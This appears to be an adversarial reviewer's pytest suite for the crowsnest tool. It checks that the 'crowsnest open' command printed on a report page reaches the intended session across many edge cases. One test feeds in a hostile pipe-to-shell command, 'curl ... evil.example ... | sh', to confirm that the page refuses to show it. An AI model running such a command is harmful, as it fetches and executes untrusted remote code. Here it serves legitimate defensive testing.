"""Probes against crowsnest issue #49, written by an adversarial reviewer.

Every test here failed on the change as it stood when it was written: the first six on
the first draft, the six under "Second pass" on the fixes to those. Almost every one says
"the command the page prints, pasted into a terminal, reaches the session it was printed
for" -- the promise `lineage.open_command` makes -- for an input the change's own tests
did not choose. Three were revised along with their fix, and each docstring says why.

Kept separate from `test_report_links.py` because the value of a refutation is that
somebody who did not write the code chose the input.
"""

from __future__ import annotations

import html as _html
import re
import shlex

import pytest
from fixtures import finished_session, registry_record, write_registry, write_transcript

from crowsnest import registry, tools
from crowsnest.__main__ import main
from crowsnest.lineage import open_command
from crowsnest.report import render_report


def _live(monkeypatch, alive):
    monkeypatch.setattr(registry, "pid_alive", lambda pid: pid in alive)
    monkeypatch.setattr(
        tools,
        "live_sessions",
        lambda **kw: registry.live_sessions(
            **{"is_alive": lambda pid: pid in alive, **kw}
        ),
    )


def _session(home, pid, sid, name=""):
    write_transcript(home, "/w/demo", sid, finished_session(sid))
    write_registry(home, registry_record(pid, sid, name=name))


def _paste(monkeypatch, command):
    """Run a printed command through the real CLI parser; the session it resolves to."""
    got = {}

    def fake_open(session, **kw):
        found = tools.resolve(session, **kw)
        got["sid"] = found.session_id
        return {"name": found.label, "how": "resolved", "detail": found.session_id}

    monkeypatch.setattr("crowsnest.__main__._open_session", fake_open)
    argv = shlex.split(command)
    assert argv[:2] == ["crowsnest", "open"]
    try:
        main(argv[1:])
    except SystemExit:
        pass
    return got.get("sid")


def test_an_unnamed_sessions_command_does_not_open_a_session_named_after_its_id(
    tmp_path, monkeypatch
):
    """An unnamed session's label is its id head, and `resolve` tries name prefixes
    before id prefixes -- so the page's command for it opens a *different* session whose
    name happens to start with that head (e.g. a worker named after its parent's id)."""
    home = tmp_path / "claude"
    _session(home, 301, "a1b2c3d4-0000-0000-0000-000000000000")
    _session(home, 302, "e5f6a7b8-0000-0000-0000-000000000000", name="a1b2c3d4-worker")
    _live(monkeypatch, {301, 302})
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(home))
    row = next(
        r for r in tools.roster(home=home, activity=False)["sessions"] if r["pid"] == 301
    )
    assert _paste(monkeypatch, row["open_command"]) == row["session_id"]


def test_a_command_for_a_home_whose_name_has_an_at_sign_reaches_it(tmp_path, monkeypatch):
    """A `[[homes]]` entry with no `name` is named after its directory, and a synced copy's
    directory is readily `user@host`. `resolve` splits on the LAST `@`, so
    `fixer@root@tw` looks for `fixer@root` in a home `tw`, and the command finds nothing.
    """
    home = tmp_path / "root@tw"
    _session(home, 401, "s401", name="fixer")
    cfg = tmp_path / "config.toml"
    cfg.write_text(f"[[homes]]\npath = '{home}'\n")
    monkeypatch.setenv("CROWSNEST_CONFIG", str(cfg))
    _live(monkeypatch, {401})
    (row,) = tools.roster(all_homes=True, activity=False)["sessions"]
    assert row["home"] == "root@tw"
    assert _paste(monkeypatch, row["open_command"]) == "s401"


def test_the_command_reaches_the_same_session_whichever_account_the_shell_selects(
    tmp_path, monkeypatch
):
    """The skill's own render (`crowsnest report --fragment --interactive`, no
    `--all-homes`) prints `crowsnest open fixer` with no home at all. That reads
    `$CLAUDE_CONFIG_DIR` of the shell it is *pasted* into, not the one that rendered it:
    with two accounts, the same command opens the other account's `fixer`."""
    rendered_in = tmp_path / "claude-iq"
    pasted_in = tmp_path / "claude"
    _session(rendered_in, 501, "s501", name="fixer")
    _session(pasted_in, 502, "s502", name="fixer")
    _live(monkeypatch, {501, 502})
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(rendered_in))
    (row,) = tools.roster(activity=False)["sessions"]
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(pasted_in))  # a fresh terminal
    assert _paste(monkeypatch, row["open_command"]) == "s501"


def _page_commands(label):
    row = {"label": label, "project": "demo", "status": "busy", "status_since": 0}
    page = render_report(
        {"sessions": [{**row, "activity": {}, "session_url": ""}], "counts": {}},
        made_at="2026-02-01T12:00:00Z",
    )
    return [
        _html.unescape(c)
        for c in re.findall(r"<code[^>]*>(crowsnest open[^<]*)</code>", page)
    ]


def test_the_page_prints_the_command_open_command_made_not_a_scrubbed_one():
    """`_fallback` passes the whole command through `safe.text`, whose `scrub` rewrites
    home-path-shaped text. A name containing `/root` is printed as `~other`, and that
    command names no session -- exactly the "link that lies" `_link` refuses to publish.

    Revised with the fix: the page may not print the unscrubbed text either, because
    nothing reaches a published page except through the sanitiser. So the promise is the
    command exactly as made, or no command at all -- and a plain name still gets one."""
    label = "notes-/root"
    assert _page_commands(label) in ([open_command({"label": label})], [])
    assert _page_commands("notes") == [open_command({"label": "notes"})]


@pytest.mark.parametrize("label", ["two  spaces", "tab\there"])
def test_the_command_a_reader_copies_off_the_page_is_the_command(label):
    """`<code>` in `.where` is not `white-space:pre`, so a browser collapses runs of
    whitespace inside the quotes: what a reader selects and pastes is `'two spaces'`,
    which is not the session's name.

    Revised with the fix. Once the stylesheet says `pre-wrap`, a regex that collapses
    whitespace no longer stands in for the browser, so this checks what the browser is
    told: the command's element keeps its whitespace. Revised again with the second pass,
    which addresses every session that has an id by that id, so no name is copied at all.
    """
    row = {
        "label": label,
        "session_id": "sid-0001",
        "project": "demo",
        "status": "busy",
        "status_since": 0,
        "activity": {},
        "session_url": "",
    }
    page = render_report(
        {"sessions": [row], "counts": {}}, made_at="2026-02-01T12:00:00Z"
    )
    (code,) = re.findall(r'<code class="way-in">([^<]*)</code>', page)
    assert re.search(r"\.way-in\{[^}]*white-space:pre-wrap", page)
    target = shlex.split(_html.unescape(code))[-1]
    assert target == "sid-0001"


# --------------------------------------------------------------------------------------
# Second pass: probes against the fixes


def test_all_homes_without_a_config_file_still_pins_the_account(tmp_path, monkeypatch):
    """With no config file, `--all-homes` reads one home named `local`, whose path is
    `$CLAUDE_CONFIG_DIR` *of whoever runs the command*. So `--all-homes fixer@local` is
    exactly as account-dependent as the bare command finding #1 was about -- on the
    acceptance command itself, `crowsnest report --all-homes`."""
    rendered_in = tmp_path / "claude-iq"
    pasted_in = tmp_path / "claude"
    _session(rendered_in, 501, "s501", name="fixer")
    _session(pasted_in, 502, "s502", name="fixer")
    monkeypatch.setenv("CROWSNEST_CONFIG", str(tmp_path / "no-such-config.toml"))
    _live(monkeypatch, {501, 502})
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(rendered_in))
    (row,) = tools.roster(all_homes=True, activity=False)["sessions"]
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(pasted_in))
    assert _paste(monkeypatch, row["open_command"]) == "s501"


def test_a_label_with_an_at_sign_is_not_moved_to_a_home_its_suffix_names(
    tmp_path, monkeypatch
):
    """`_split_home` takes the longest live home the address ends with. Session `job@root`
    on home `tw` is printed `--all-homes job@root@tw`; with a home `root@tw` also live, the
    split makes it `job` on `root@tw` -- another session. Before the fix this command, and
    `crowsnest show job@root@tw --all-homes`, reached the right one."""
    tw, root_tw = tmp_path / "tw", tmp_path / "rt"
    _session(tw, 601, "s601", name="job@root")
    _session(root_tw, 602, "s602", name="job")
    cfg = tmp_path / "config.toml"
    cfg.write_text(
        f"[[homes]]\nname = \"tw\"\npath = '{tw}'\n\n"
        f"[[homes]]\nname = \"root@tw\"\npath = '{root_tw}'\n"
    )
    monkeypatch.setenv("CROWSNEST_CONFIG", str(cfg))
    _live(monkeypatch, {601, 602})
    rows = tools.roster(all_homes=True, activity=False)["sessions"]
    row = next(r for r in rows if r["session_id"] == "s601")
    assert _paste(monkeypatch, row["open_command"]) == "s601"


def test_two_sessions_with_one_name_each_get_a_command_that_reaches_it(
    tmp_path, monkeypatch
):
    """#42: names are not unique. Both rows print `crowsnest open ... fixer`, which
    `resolve` refuses as ambiguous, so neither command reaches anything. The roster sees
    every row, and the id substitution added for unnamed sessions is the fix already."""
    home = tmp_path / "claude"
    _session(home, 701, "s701", name="fixer")
    _session(home, 702, "s702", name="fixer")
    _live(monkeypatch, {701, 702})
    rows = tools.roster(home=home, activity=False)["sessions"]
    assert {_paste(monkeypatch, r["open_command"]) for r in rows} == {"s701", "s702"}


def test_a_relative_config_dir_gives_a_command_that_works_from_another_directory(
    tmp_path, monkeypatch
):
    """`_tilde` only rewrites a path under `Path.home()`; anything else is printed as it
    came. A relative `$CLAUDE_CONFIG_DIR` becomes `--home claude`, which a terminal in any
    other directory resolves to a different, empty, home."""
    work = tmp_path / "work"
    _session(work / "claude", 801, "s801", name="fixer")
    _live(monkeypatch, {801})
    monkeypatch.chdir(work)
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", "claude")
    (row,) = tools.roster(activity=False)["sessions"]
    monkeypatch.chdir(tmp_path)
    assert _paste(monkeypatch, row["open_command"]) == "s801"


def test_a_home_under_another_users_directory_keeps_its_way_in():
    """A home outside the reader's own (root rendering `/home/deploy/.claude` on a
    server) is printed in full, `scrub` rewrites `/home/deploy`, and `_fallback` then
    drops the command -- for every row on that page, silently. "Exact or none" becomes
    "none" for a whole account, with nothing saying why.

    Revised with the fix, taking the reviewer's second option. The path cannot be printed
    unscrubbed, so the page must *say* the command was withheld rather than drop it."""
    row = {
        "label": "fixer",
        "session_id": "s901",
        "project": "demo",
        "status": "busy",
        "status_since": 0,
        "activity": {},
        "session_url": "",
    }
    row["open_command"] = open_command(row, home_dir="/home/deploy/.claude")
    page = render_report(
        {"sessions": [row], "counts": {}}, made_at="2026-02-01T12:00:00Z"
    )
    assert re.findall(r'<code class="way-in">', page) or "command withheld" in page
    assert "/home/deploy" not in page


def test_the_page_prints_only_a_crowsnest_open_command_as_the_way_in():
    """`_fallback` now prints a row's `open_command` verbatim. `render_report` is public
    and a roster can be built by hand, so any string reaches the page presented as "the
    command that reaches this session" -- the one thing a reader is told to paste."""
    row = {
        "label": "fixer",
        "project": "demo",
        "status": "busy",
        "status_since": 0,
        "activity": {},
        "session_url": "",
        "open_command": "curl -s https://evil.example/x | sh",
    }
    page = render_report(
        {"sessions": [row], "counts": {}}, made_at="2026-02-01T12:00:00Z"
    )
    shown = [
        shlex.split(_html.unescape(c))
        for c in re.findall(r'<code class="way-in">([^<]*)</code>', page)
    ]
    assert shown and all(argv[:2] == ["crowsnest", "open"] for argv in shown)


# --------------------------------------------------------------------------------------
# Third pass: probes against the redesign (whole-id address, `_home_to_pin`)


def test_a_config_file_that_names_no_homes_still_pins_the_account(tmp_path, monkeypatch):
    """`_home_to_pin` trusts `--all-homes` whenever a config file *exists*. A file holding
    only `claude_bin` (or nothing) names no homes, so `homes()` falls back to `local` =
    the running shell's `$CLAUDE_CONFIG_DIR` -- and `--all-homes <id>`, pasted in the other
    account's terminal, finds nothing."""
    rendered_in, pasted_in = tmp_path / "claude-iq", tmp_path / "claude"
    _session(rendered_in, 501, "s501", name="fixer")
    _session(pasted_in, 502, "s502", name="fixer")
    cfg = tmp_path / "config.toml"
    cfg.write_text('claude_bin = "claude"\n')
    monkeypatch.setenv("CROWSNEST_CONFIG", str(cfg))
    _live(monkeypatch, {501, 502})
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(rendered_in))
    (row,) = tools.roster(all_homes=True, activity=False)["sessions"]
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(pasted_in))
    assert _paste(monkeypatch, row["open_command"]) == "s501"


def test_a_pasted_command_for_a_session_on_another_machine_raises_no_local_terminal(
    tmp_path, monkeypatch
):
    """The page now gives every remote-home session without Remote Control a command.
    `--all-homes <id>` resolves it from the synced copy, and `open_session` then hands it
    to the local opener, whose iTerm strategy raises any *local* tab whose name contains
    the remote session's name. A session on another machine has no terminal here."""
    from crowsnest.open import open_session

    remote = tmp_path / "server"
    _session(remote, 1001, "s1001", name="cn")
    cfg = tmp_path / "config.toml"
    cfg.write_text(
        f"[[homes]]\nname = \"server\"\npath = '{remote}'\nremote = true\n"
        "fresh_seconds = 1e12\n"
    )
    monkeypatch.setenv("CROWSNEST_CONFIG", str(cfg))
    _live(monkeypatch, set())  # none of the remote pids are this machine's
    (row,) = tools.roster(all_homes=True, activity=False)["sessions"]
    argv = shlex.split(row["open_command"])
    raised = []
    open_session(
        argv[-1],
        all_homes="--all-homes" in argv,
        opener=lambda s: raised.append(s.name) or {"how": "iterm", "detail": "activated"},
    )
    assert raised == []
